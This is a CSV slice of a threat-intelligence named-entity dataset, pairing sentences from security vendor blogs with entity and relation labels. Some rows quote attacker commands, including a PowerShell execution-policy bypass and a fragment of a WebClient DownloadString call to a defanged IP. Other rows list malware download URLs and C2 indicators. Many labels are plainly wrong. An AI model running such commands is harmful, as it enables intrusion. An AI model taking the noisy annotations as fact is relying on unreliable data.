,index,text,entities,relations,Comments,id,label,start_offset,end_offset
5028,11360,"public void ManageTakeOut() { string text = ""PipeName"";","[{'id': 34667, 'label': 'location', 'start_offset': 0, 'end_offset': 6}, {'id': 34668, 'label': 'malware', 'start_offset': 7, 'end_offset': 11}]",[],[],34667,location,0,6
5029,4614,"Overall, Microsoft released patches for 89 unique CVEs in March—14 of which were listed as Critical and 75 listed as Important in severity.","[{'id': 50519, 'label': 'identity', 'start_offset': 9, 'end_offset': 18}, {'id': 50520, 'label': 'vulnerability', 'start_offset': 40, 'end_offset': 54}, {'id': 50521, 'label': 'TIME', 'start_offset': 58, 'end_offset': 66}]",[],[],50519,identity,9,18
5030,2703," By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.",[],[],[],,,,
5031,10814, The service is started when the device connectivity is changed.,[],[],[],,,,
5032,3831,"When ANEL executes, a decrypted DLL file with the filename “lena_http_dll.dll” is expanded in memory.","[{'id': 11620, 'label': 'malware', 'start_offset': 5, 'end_offset': 9}, {'id': 11621, 'label': 'FILEPATH', 'start_offset': 60, 'end_offset': 77}]",[],[],11620,malware,5,9
5033,12434,"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below.",[],[],[],,,,
5034,7141,"However, traces of the exploitation of the Microsoft Exchange vulnerability CVE-2020-0688 were found.",[],[],[],,,,
5035,524,"For example, AlumniLocker is first delivered as a phishing PDF.","[{'id': 46151, 'label': 'malware', 'start_offset': 13, 'end_offset': 25}, {'id': 46152, 'label': 'attack-pattern', 'start_offset': 50, 'end_offset': 62}]",[],[],46151,malware,13,25
5036,4290,"Malicious mobile apps are common infection vectors for cybercriminals, as they can attract specific target audiences.",[],[],[],,,,
5037,3672,"     Figure 1. ATT&CK® tactics shared between Carbanak and FIN7      The following are the tactics and techniques that are employed by Carbanak and FIN7, as shared by MITRE.","[{'id': 49464, 'label': 'threat-actor', 'start_offset': 135, 'end_offset': 143}, {'id': 49465, 'label': 'threat-actor', 'start_offset': 148, 'end_offset': 152}, {'id': 49462, 'label': 'threat-actor', 'start_offset': 46, 'end_offset': 54}, {'id': 49463, 'label': 'threat-actor', 'start_offset': 59, 'end_offset': 63}, {'id': 49466, 'label': 'identity', 'start_offset': 167, 'end_offset': 172}]",[],[],49464,threat-actor,135,143
5038,9486,oRAT,"[{'id': 29124, 'label': 'malware', 'start_offset': 0, 'end_offset': 4}]",[],[],29124,malware,0,4
5039,478, You can also learn more about these new technologies and look at deploying them as an additional layer of protection.  ,[],[],[],,,,
5040,2922," In our research posting “Large Scale Monero Cryptocurrency Mining Operation using XMRig” we detail a new malware campaign that is global in scale, very large in the likely number of victims and uses well established techniques to mine the Monero cryptocurrency.","[{'id': 48092, 'label': 'SOFTWARE', 'start_offset': 38, 'end_offset': 44}, {'id': 48094, 'label': 'SOFTWARE', 'start_offset': 240, 'end_offset': 246}, {'id': 48093, 'label': 'tools', 'start_offset': 83, 'end_offset': 88}]",[],[],48092,SOFTWARE,38,44
5041,7771,"While the previous strings had the modified AmmyyAdmin binary since the source code was leaked, TA505 changed the strings in this sample to PopssAdmin.","[{'id': 24090, 'label': 'attack-pattern', 'start_offset': 72, 'end_offset': 78}, {'id': 24092, 'label': 'location', 'start_offset': 130, 'end_offset': 136}]",[],[],24090,attack-pattern,72,78
5042,7124,FRP Tool,"[{'id': 22283, 'label': 'malware', 'start_offset': 0, 'end_offset': 3}, {'id': 22284, 'label': 'location', 'start_offset': 4, 'end_offset': 8}]",[],[],22283,malware,0,3
5043,9164,The ripple effect led other cybercriminal groups to lie low for the rest of the year.,[],[],[],,,,
5044,8714,"Their blog contains write-ups and analysis of vulnerabilities that have been publicly disclosed, including “guest” posts from unwitting legitimate security researchers, likely in an attempt to build additional credibility with other security researchers.","[{'id': 26929, 'label': 'threat-actor', 'start_offset': 26, 'end_offset': 29}, {'id': 26930, 'label': 'location', 'start_offset': 30, 'end_offset': 33}, {'id': 26931, 'label': 'location', 'start_offset': 147, 'end_offset': 155}, {'id': 26932, 'label': 'location', 'start_offset': 169, 'end_offset': 175}, {'id': 26933, 'label': 'location', 'start_offset': 233, 'end_offset': 241}]",[],[],26929,threat-actor,26,29
5045,4238,Spreadsheet file   ,[],[],[],,,,
5046,7024,New Version of SysUpdate Malware      Figure 1.,"[{'id': 22024, 'label': 'malware', 'start_offset': 15, 'end_offset': 24}]",[],[],22024,malware,15,24
5047,6161,The attack begins with a spear-phishing email that is appended with obfuscated JavaScript.,"[{'id': 19050, 'label': 'location', 'start_offset': 25, 'end_offset': 30}, {'id': 19051, 'label': 'attack-pattern', 'start_offset': 31, 'end_offset': 39}]",[],[],19050,location,25,30
5048,4653,"Once provided, the data in the ""Identity"" field is sent to a C2 for confirmation.",[],[],[],,,,
5049,5081,"The campaign, consistent with Operation Dream Job, targeted over 250 individuals working for 10 different news media, domain registrars, web hosting providers and software vendors.","[{'id': 51188, 'label': 'campaign', 'start_offset': 30, 'end_offset': 49}]",[],[],51188,campaign,30,49
5050,3803,.doc .rtf .msg   Link,[],[],[],,,,
5051,13775, Figure 4.,[],[],[],,,,
5052,4671,The program will delete any security emails from Google generated by the attacker’s activity.,"[{'id': 50574, 'label': 'identity', 'start_offset': 49, 'end_offset': 55}]",[],[],50574,identity,49,55
5053,6093,"As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products.","[{'id': 18829, 'label': 'tools', 'start_offset': 102, 'end_offset': 108}, {'id': 18830, 'label': 'location', 'start_offset': 109, 'end_offset': 112}, {'id': 18831, 'label': 'location', 'start_offset': 113, 'end_offset': 121}]",[],[],18829,tools,102,108
5054,5218,Conclusion,[],[],[],,,,
5055,11281,"         However, since threat actors tend to cover their tracks quickly, by the time the security analyst is reviewing the incident, there is a chance that critical information may have been permanently deleted and is no longer readily accessible.          Instead of depending on a security analyst to review a credential dumping event and manually collecting artifacts for their investigation, Trend Micro wanted to automate the collection of this evidence as quickly as possible when a detection occurs.","[{'id': 34473, 'label': 'location', 'start_offset': 81, 'end_offset': 85}, {'id': 34474, 'label': 'location', 'start_offset': 90, 'end_offset': 98}, {'id': 34475, 'label': 'location', 'start_offset': 145, 'end_offset': 151}, {'id': 34476, 'label': 'location', 'start_offset': 178, 'end_offset': 181}, {'id': 34477, 'label': 'location', 'start_offset': 212, 'end_offset': 215}, {'id': 34478, 'label': 'location', 'start_offset': 284, 'end_offset': 292}, {'id': 34479, 'label': 'attack-pattern', 'start_offset': 313, 'end_offset': 331}, {'id': 34480, 'label': 'location', 'start_offset': 338, 'end_offset': 341}]",[],[],34473,location,81,85
5056,620,"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ",[],[],[],,,,
5057,4640,"After the program has finished downloading the inbox, it reverts the language back to its original settings and deletes any security emails from Google.","[{'id': 50559, 'label': 'identity', 'start_offset': 145, 'end_offset': 151}]",[],[],50559,identity,145,151
5058,4924,We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.,"[{'id': 50938, 'label': 'attack-pattern', 'start_offset': 117, 'end_offset': 125}]",[],[],50938,attack-pattern,117,125
5059,12611,It also contains two checks to verify if it’s running.,[],[],[],,,,
5060,2005, Two of the initial set of samples identified create a unique mutex containing the following message:,[],[],[],,,,
5061,14319,"When the extension plugin (BREX_INFOSTEAL.A) is downloaded, the victims will be instructed how to load it into the browser.",[],[],[],,,,
5062,4776,We also provide research grants to security researchers to help fund and support the research community.,[],[],[],,,,
5063,6465,The next command executed is the following: powershell.exe -exec bypass -w 1 -file a.ps1,[],[],[],,,,
5064,4108,      Figure 10.,[],[],[],,,,
5065,4991,This means the renderer exploit did not enable MojoJS bindings like we often see in public exploits.,[],[],[],,,,
5066,2410, The Spring Framework is an open-source application framework and inversion of the control container for the Java platform.,"[{'id': 47490, 'label': 'SOFTWARE', 'start_offset': 5, 'end_offset': 21}]",[],[],47490,SOFTWARE,5,21
5067,11525,India,[],[],[],,,,
5068,13939,But some ransomware actors have gone even further.,[],[],[],,,,
5069,736,"Dubbed OMIGOD, the four vulnerabilities were found to directly affect Azure Cloud Instances.","[{'id': 46327, 'label': 'vulnerability', 'start_offset': 7, 'end_offset': 13}, {'id': 46328, 'label': 'SOFTWARE', 'start_offset': 70, 'end_offset': 81}]","[{'id': 181, 'from_id': 46328, 'to_id': 46327, 'type': 'has'}]",[],46327,vulnerability,7,13
5070,2010, The ransomware creates an ID for the victim which has to be sent to the threat actor to make it possible to identify the victim and provide a decryptor.,[],[],[],,,,
5071,10189,The phishing typically started with a customized email introducing the company and its products.,"[{'id': 31111, 'label': 'attack-pattern', 'start_offset': 4, 'end_offset': 12}, {'id': 31112, 'label': 'location', 'start_offset': 79, 'end_offset': 82}]",[],[],31111,attack-pattern,4,12
5072,151,"Once malware is running on the user’s system, it seeks out and encrypts files and folders that hold information critical for the user, such as documents, business applications or even database files.",[],[],[],,,,
5073,4158,"However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks.",[],[],[],,,,
5074,9330,Mirrorthief,[],[],[],,,,
5075,3237,The HTTP server does nothing but returns string “BPSV3” to request.,[],[],[],,,,
5076,4793,Any one government’s ability to meaningfully impact this market is limited; only through a concerted international effort can this serious risk to online safety be mitigated.,[],[],[],,,,
5077,2713,"Once identified, they then craft a seemingly endless supply of exploits that leverage these vulnerabilities to deliver unknown malware and compromise networks and endpoints.",[],[],[],,,,
5078,3858,"After the execution of accevent.exe, it loads event.dll, which will be placed in the same folder (so it takes loading priority), after which event.dll decrypts and loads the encrypted backdoor ssssss.ddd, which is BKDR_ANEL.","[{'id': 49719, 'label': 'FILEPATH', 'start_offset': 141, 'end_offset': 150}, {'id': 49717, 'label': 'FILEPATH', 'start_offset': 23, 'end_offset': 35}, {'id': 49718, 'label': 'FILEPATH', 'start_offset': 46, 'end_offset': 55}, {'id': 49720, 'label': 'FILEPATH', 'start_offset': 193, 'end_offset': 203}, {'id': 49721, 'label': 'malware', 'start_offset': 214, 'end_offset': 223}]","[{'id': 862, 'from_id': 49717, 'to_id': 49718, 'type': 'downloads'}, {'id': 863, 'from_id': 49720, 'to_id': 49721, 'type': 'duplicate-of'}]",[],49719,FILEPATH,141,150
5079,1751," Please mark, I'm not a robot!  By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.",[],[],[],,,,
5080,10294,IP address possibly compromised by Pawn Storm.,"[{'id': 31429, 'label': 'threat-actor', 'start_offset': 35, 'end_offset': 45}]",[],[],31429,threat-actor,35,45
5081,405,"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ",[],[],[],,,,
5082,12347,"Every malicious piece of this attack was hosted on legitimate services, making it harder for defenders to rely on network signals for detection.",[],[],[],,,,
5083,9032,This RATANKBA backdoor is what is used to communicate with RATANKBA’s Command-and-Control (C&C) server.,"[{'id': 27904, 'label': 'malware', 'start_offset': 5, 'end_offset': 13}, {'id': 27905, 'label': 'tools', 'start_offset': 59, 'end_offset': 67}, {'id': 27906, 'label': 'location', 'start_offset': 78, 'end_offset': 81}]",[],[],27904,malware,5,13
5084,3896,"Lastly, backups should be isolated from network connections.",[],[],[],,,,
5085,2684, The operator of LockBit 2.0 has provided a comparative table speed showing the information stealer compared to other tools.,"[{'id': 47892, 'label': 'threat-actor', 'start_offset': 17, 'end_offset': 28}, {'id': 47893, 'label': 'attack-pattern', 'start_offset': 80, 'end_offset': 99}]",[],[],47892,threat-actor,17,28
5086,13023,"Here is a deeper look at the campaign activity TAG has observed over the past two weeks: Curious Gorge, a group TAG attributes to China's PLA SSF, has conducted campaigns against government and military organizations in Ukraine, Russia, Kazakhstan, and Mongolia.","[{'id': 48841, 'label': 'identity', 'start_offset': 130, 'end_offset': 145}, {'id': 48843, 'label': 'location', 'start_offset': 220, 'end_offset': 227}, {'id': 48840, 'label': 'threat-actor', 'start_offset': 89, 'end_offset': 102}, {'id': 48842, 'label': 'identity', 'start_offset': 112, 'end_offset': 116}, {'id': 48845, 'label': 'location', 'start_offset': 237, 'end_offset': 247}, {'id': 48839, 'label': 'identity', 'start_offset': 47, 'end_offset': 51}, {'id': 48844, 'label': 'location', 'start_offset': 229, 'end_offset': 235}, {'id': 48846, 'label': 'location', 'start_offset': 253, 'end_offset': 261}]","[{'id': 467, 'from_id': 48840, 'to_id': 48841, 'type': 'attributed-to'}, {'id': 468, 'from_id': 48840, 'to_id': 48843, 'type': 'duplicate-of'}, {'id': 469, 'from_id': 48840, 'to_id': 48844, 'type': 'duplicate-of'}, {'id': 470, 'from_id': 48840, 'to_id': 48845, 'type': 'duplicate-of'}, {'id': 471, 'from_id': 48840, 'to_id': 48846, 'type': 'duplicate-of'}]",[],48841,identity,130,145
5087,1278," Three of the backdoors, NFlog, PoisonIvy, and NewCT have previously been publicly associated with DragonOK.","[{'id': 44962, 'label': 'malware', 'start_offset': 25, 'end_offset': 30}, {'id': 44963, 'label': 'malware', 'start_offset': 32, 'end_offset': 41}, {'id': 44964, 'label': 'malware', 'start_offset': 47, 'end_offset': 52}, {'id': 44965, 'label': 'threat-actor', 'start_offset': 99, 'end_offset': 107}]","[{'id': 48, 'from_id': 44962, 'to_id': 44965, 'type': 'authored-by'}, {'id': 47, 'from_id': 44963, 'to_id': 44965, 'type': 'authored-by'}, {'id': 46, 'from_id': 44964, 'to_id': 44965, 'type': 'authored-by'}]",[],44962,malware,25,30
5088,6880,One notable campaign attempted to target personal accounts of U.S. government employees with phishing lures using American fast food franchises and COVID-19 messaging.,"[{'id': 21511, 'label': 'location', 'start_offset': 12, 'end_offset': 20}, {'id': 21512, 'label': 'location', 'start_offset': 34, 'end_offset': 40}, {'id': 21514, 'label': 'attack-pattern', 'start_offset': 93, 'end_offset': 101}, {'id': 21516, 'label': 'location', 'start_offset': 144, 'end_offset': 147}]",[],[],21511,location,12,20
5089,3985,It can also be compromised through a patch or hotfix.,[],[],[],,,,
5090,13573,Some of the delivered scripts revealed that the campaign was trying to obtain administrator credentials for e-commerce websites using two different approaches.,"[{'id': 51655, 'label': 'SOFTWARE', 'start_offset': 108, 'end_offset': 127}]",[],[],51655,SOFTWARE,108,127
5091,2044,"The discovered samples are primarily Cobalt Strike Beacons, utilizing heavy control flow obfuscation – unlike the HelloXD ransomware samples we had previously seen.","[{'id': 47133, 'label': 'tools', 'start_offset': 37, 'end_offset': 58}, {'id': 47134, 'label': 'malware', 'start_offset': 114, 'end_offset': 121}]",[],[],47133,tools,37,58
5092,877,"For a copy of this file’s IDA Pro database (idb), please refer here.","[{'id': 46411, 'label': 'SOFTWARE', 'start_offset': 26, 'end_offset': 33}]",[],[],46411,SOFTWARE,26,33
5093,2745,"All versions of PAN-OS and Panorama include the vulnerable version of Bash, but we’ve determined the issue is only exploitable by authenticated users.","[{'id': 45683, 'label': 'SOFTWARE', 'start_offset': 16, 'end_offset': 22}, {'id': 45684, 'label': 'SOFTWARE', 'start_offset': 27, 'end_offset': 35}, {'id': 45685, 'label': 'SOFTWARE', 'start_offset': 70, 'end_offset': 75}]",[],[],45683,SOFTWARE,16,22
5094,10428,"At the dawn of the Fourth of July weekend, Kaseya has been hit with a ransomware attack, as reported in the company’s own announcement.","[{'id': 31697, 'label': 'TIME', 'start_offset': 3, 'end_offset': 41}, {'id': 31699, 'label': 'identity', 'start_offset': 59, 'end_offset': 62}]",[],[],31697,TIME,3,41
5095,35,"To understand where we are now, it helps to look at how we got here, and to look at the evolution of common cybercriminal activities.",[],[],[],,,,
5096,14033,That information often gets stripped from binaries.,[],[],[],,,,
5097,14175,The good news is that best practice cybersecurity advice does not need to change.,[],[],[],,,,
5098,12539,This number was in the 200s when we obtained the exploit chain.,[],[],[],,,,
5099,3036,"The “firmware”: this is the software that is on the physical device itself, like the actual router, the actual car or the actual DVR.",[],[],[],,,,
5100,2401,The exploitation of this vulnerability could result in a webshell being installed onto the compromised server that allows further command execution.,[],[],[],,,,
5101,10789,These benign versions of the application were created during the period from February 2020 until March 2021.,[],[],[],,,,
5102,4981,"These commands include recording audio, adding CA certificates, and hiding apps.",[],[],[],,,,
5103,7727,"In another routine, an Excel file attachment downloads the NSIS installer once the user enables the malicious macros from hxxp://109[.]234[.]37[.]15:80/j1 or hxxp://169[.]239[.]128[.]170/j1.","[{'id': 23997, 'label': 'malware', 'start_offset': 59, 'end_offset': 63}]",[],[],23997,malware,59,63
5104,12935,"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild.",[],[],[],,,,
5105,6630, https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html  https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/,"[{'id': 20573, 'label': 'URL', 'start_offset': 1, 'end_offset': 102}, {'id': 20574, 'label': 'URL', 'start_offset': 104, 'end_offset': 241}]",[],[],20573,URL,1,102
5106,10900,The domain name “upn-sec3-msd[.]com” was mentioned in another StrongPity report.,[],[],[],,,,
5107,14314,"Subsequently, it writes them into files before uploading it to the C&C server.","[{'id': 48536, 'label': 'Infrastucture', 'start_offset': 67, 'end_offset': 77}]",[],[],48536,Infrastucture,67,77
5108,1856,"Checking for log4shell     We also observed more system network configuration discovery techniques being run, possibly for lateral movement as it tried looking for other available endpoints.","[{'id': 5440, 'label': 'attack-pattern', 'start_offset': 49, 'end_offset': 87}, {'id': 46984, 'label': 'attack-pattern', 'start_offset': 123, 'end_offset': 139}]",[],[],5440,attack-pattern,49,87
5109,572,These three contribute 7.2% out of the total infected numbers we collected.,[],[],[],,,,
5110,3459,"Compared to when C&C information is embedded within the malware, where it’s preset and can thus be easily blocked, this tactic lets Blackgear’s operators to quickly change C&C servers as needed.","[{'id': 49249, 'label': 'threat-actor', 'start_offset': 132, 'end_offset': 141}]",[],[],49249,threat-actor,132,141
5111,13933,"As demonstrated by the recent activities of DarkSide, modern ransomware has changed in many aspects: bigger targets, more advanced extortion techniques, and farther-reaching consequences beyond the victims themselves.","[{'id': 43202, 'label': 'malware', 'start_offset': 44, 'end_offset': 52}]",[],[],43202,malware,44,52
5112,3520, Export name Year How C&C information is retreieved TStartUp 2005 – 2012,"[{'id': 49305, 'label': 'TIME', 'start_offset': 61, 'end_offset': 72}]",[],[],49305,TIME,61,72
5113,8096,The apps have since been removed from Google Play.,[],[],[],,,,
5114,5475,We further tested Tweety Chat and saw red flags indicating their targets of interest: verification emails with a physical address whose postal code is assigned to a provincial capital that also appears (upon logging in) as a chat channel in Tweety Chat.,"[{'id': 51466, 'label': 'SOFTWARE', 'start_offset': 18, 'end_offset': 24}, {'id': 51467, 'label': 'SOFTWARE', 'start_offset': 241, 'end_offset': 247}]",[],[],51466,SOFTWARE,18,24
5115,13880,A DarkSide data leak site is later discovered.,[],[],[],,,,
5116,3593,"The modified method which was renamed to Kirkuk, which is also a name of a city in Iraq What other payloads are using KurdishCoder?",[],[],[],,,,
5117,14096,"At the same time, practically all code for the SLUB malware was created from scratch.","[{'id': 48176, 'label': 'malware', 'start_offset': 47, 'end_offset': 52}]",[],[],48176,malware,47,52
5118,2178,Customers can leverage this service with best practice configuration for further protection.,[],[],[],,,,
5119,9803,Operation ENDTRADE’s timeline,[],[],[],,,,
5120,3717,FIN7 attacks can stage collected data in a particular location in preparation for exfiltration.,"[{'id': 49517, 'label': 'threat-actor', 'start_offset': 0, 'end_offset': 4}]",[],[],49517,threat-actor,0,4
5121,10306,.Win32.TRX.XXPE50FFF039,[],[],[],,,,
5122,4390,"We tested HYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo! and Microsoft accounts.","[{'id': 50203, 'label': 'malware', 'start_offset': 10, 'end_offset': 21}]",[],[],50203,malware,10,21
5123,13898,Some of the known lateral movement methods deployed by DarkSide use PSExec and RDP.,"[{'id': 43087, 'label': 'malware', 'start_offset': 68, 'end_offset': 74}, {'id': 43088, 'label': 'location', 'start_offset': 75, 'end_offset': 78}, {'id': 43089, 'label': 'malware', 'start_offset': 79, 'end_offset': 82}]",[],[],43087,malware,68,74
5124,13000,"This campaign, targeting high risk individuals in Ukraine, contained links leading to compromised websites where the first stage phishing page was hosted.","[{'id': 48800, 'label': 'location', 'start_offset': 50, 'end_offset': 57}, {'id': 48801, 'label': 'attack-pattern', 'start_offset': 129, 'end_offset': 138}]",[],[],48800,location,50,57
5125,6856,This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 of 2020.,[],[],[],,,,
5126,6311," We encourage all security vendors to create protections to detect activity from this tool and all organizations to be on alert for activity from this tool.  Palo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Cortex XDR and WildFire malware analysis.","[{'id': 19580, 'label': 'location', 'start_offset': 18, 'end_offset': 26}, {'id': 19581, 'label': 'location', 'start_offset': 86, 'end_offset': 90}, {'id': 19582, 'label': 'location', 'start_offset': 91, 'end_offset': 94}, {'id': 19583, 'label': 'location', 'start_offset': 122, 'end_offset': 127}, {'id': 19584, 'label': 'location', 'start_offset': 151, 'end_offset': 155}, {'id': 19587, 'label': 'location', 'start_offset': 285, 'end_offset': 288}, {'id': 19588, 'label': 'malware', 'start_offset': 289, 'end_offset': 297}]",[],[],19580,location,18,26
5127,4098, Command Description CMDCommand Executes commands DownloadCloudFile Downloads files UploadCloudFile Uploads files GetDir Lists directories GetDirFile Lists files in a directory DeleteSelf Deletes itself  SmileSvr  ,[],[],[],,,,
5128,6004,"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin.",[],[],[],,,,
5129,1364,"By supplying the boolean true, the comparison between boolean true and the reset code string results in a boolean true, even though the two variables have different types.",[],[],[],,,,
5130,8834, The scheduled task was not created for persistence.,"[{'id': 27367, 'label': 'attack-pattern', 'start_offset': 5, 'end_offset': 19}]",[],[],27367,attack-pattern,5,19
5131,174,"There is no effective solution for ransomware at the operating system level, as outlined above.",[],[],[],,,,
5132,6499,System.Net.WebClient).DownloadString('hxxp://23.94.50[.]197:444/index.jsp/deb2b1a127c472229babbb8dc2dca1c2/QPKb49mivezAdai1,"[{'id': 20151, 'label': 'malware', 'start_offset': 7, 'end_offset': 10}, {'id': 20152, 'label': 'MD5', 'start_offset': 74, 'end_offset': 106}]",[],[],20151,malware,7,10
5133,5067,"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information.",[],[],[],,,,
5134,4648,GET http://{C2}/Index.php?Ck=OK HTTP/1.1,"[{'id': 50567, 'label': 'URL', 'start_offset': 4, 'end_offset': 31}]",[],[],50567,URL,4,31
5135,4656,Host: {C2} Accept-Encoding: gzip,[],[],[],,,,
5136,7434,In these attacks a user would get a message like this:,[],[],[],,,,
5137,7032,"In detail, this process involves multiple steps.",[],[],[],,,,
5138,14120,     Figure 13.,[],[],[],,,,
5139,8280,"In some cases, compromised SMTP servers belonging to the hotels he had breached were used.",[],[],[],,,,
5140,14328,"As seen in the figure below, it also has other games aside from Virtual Girlfriend.","[{'id': 48555, 'label': 'malware', 'start_offset': 64, 'end_offset': 82}]",[],[],48555,malware,64,82
5141,3731,"On April 13, they updated their advisory with information that CVE-2022-22954 is being exploited in the wild.","[{'id': 49535, 'label': 'vulnerability', 'start_offset': 63, 'end_offset': 77}, {'id': 49536, 'label': 'TIME', 'start_offset': 3, 'end_offset': 11}]",[],[],49535,vulnerability,63,77
5142,3645,"And like with all targeted attacks, you don’t have to be the ultimate target of the attack campaign to be a target: this is a tactic that can be used as part of a broader attack campaign.",[],[],[],,,,
5143,569,"At the time of infection experiments, 1 BTC equaled approximately $54,649, suggesting that the exchange rate in the ransom note is not updated on the fly.",[],[],[],,,,
5144,3148,"This threat detection tool, which will work closely with Trend Micro cloud solutions, will provide another valuable layer of defense in our fight against a shared adversary.","[{'id': 48269, 'label': 'SOFTWARE', 'start_offset': 57, 'end_offset': 84}]",[],[],48269,SOFTWARE,57,84
5145,9875,It provides a more comprehensive look at APT33 and other critical threats.,"[{'id': 30105, 'label': 'threat-actor', 'start_offset': 41, 'end_offset': 46}, {'id': 30106, 'label': 'location', 'start_offset': 47, 'end_offset': 50}]",[],[],30105,threat-actor,41,46
5146,4933,"In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit.","[{'id': 50951, 'label': 'threat-actor', 'start_offset': 15, 'end_offset': 20}, {'id': 50950, 'label': 'TIME', 'start_offset': 3, 'end_offset': 13}]",[],[],50951,threat-actor,15,20
5147,13604,The fake Flash installer download website     Analysis of the fake Flash installer,[],[],[],,,,
5148,12567,"Despite the exploit being an executable instead of shellcode, it was not a standalone binary we could run in our virtual environment.",[],[],[],,,,
5149,3792,"In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal — with a particular focus on the evolution of ANEL and how it is used in the campaign.","[{'id': 49638, 'label': 'malware', 'start_offset': 149, 'end_offset': 153}, {'id': 49637, 'label': 'campaign', 'start_offset': 30, 'end_offset': 41}]",[],[],49638,malware,149,153
5150,128,"Using this access, attackers will essentially steal compute resources and exchange them for cryptocurrency credit.","[{'id': 45843, 'label': 'attack-pattern', 'start_offset': 46, 'end_offset': 69}]",[],[],45843,attack-pattern,46,69
5151,408, Unauthorized coin mining is a new threat that can affect retailers and shoppers in a way that could impact or even halt their online shopping experience.,"[{'id': 44747, 'label': 'attack-pattern', 'start_offset': 1, 'end_offset': 25}]",[],[],44747,attack-pattern,1,25
5152,2852," For protections, customers are advised to view this blog post that outlines the various ways the Palo Alto Networks platform prevents this threat.  Cyber Threat Alliance member ElevenPaths has developed a tool which can be used to attempt to recover some files deleted by WanaCrypt0r.","[{'id': 48059, 'label': 'identity', 'start_offset': 178, 'end_offset': 189}, {'id': 48058, 'label': 'identity', 'start_offset': 149, 'end_offset': 170}, {'id': 48057, 'label': 'identity', 'start_offset': 98, 'end_offset': 116}, {'id': 48056, 'label': 'malware', 'start_offset': 273, 'end_offset': 284}]",[],[],48059,identity,178,189
5153,4078,HTShell hardcoded and encoded cookie string in the request header     The response handler of HTShell will use “`” as delimiter to split the command code and argument for the received command.,"[{'id': 49914, 'label': 'malware', 'start_offset': 94, 'end_offset': 101}, {'id': 49913, 'label': 'malware', 'start_offset': 0, 'end_offset': 7}]",[],[],49914,malware,94,101
5154,13088,That’s why we’re thrilled to be joining the ROS-Industrial Consortium (ROS-I) to help accelerate the secure development of robotic Industry 4.0 applications.,[],[],[],,,,
5155,7477,Infection Chain  Figure 1.,[],[],[],,,,
5156,1396,"  Product-specific protections have been implemented as a result of research performed in recent days, and those protections will be augmented as needed as more details come to light.",[],[],[],,,,
5157,13975,This focus can be effective to simplify and explain the progression of an attack through the different layers.,[],[],[],,,,
5158,2979,Take time to set up an account for everyone with their own username and password.,[],[],[],,,,
5159,368,"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ",[],[],[],,,,
5160,12812, C&C Server PLEAD Shrouded Crossbow Waterbear itaiwans[.]com Yes No Yes microsoftmse[.]com Yes Yes No 211[.]72[.]242[.]120 Yes Yes No,"[{'id': 39892, 'label': 'malware', 'start_offset': 12, 'end_offset': 17}, {'id': 39893, 'label': 'threat-actor', 'start_offset': 18, 'end_offset': 35}, {'id': 39894, 'label': 'malware', 'start_offset': 36, 'end_offset': 45}, {'id': 39895, 'label': 'IPV4', 'start_offset': 102, 'end_offset': 122}]",[],[],39892,malware,12,17
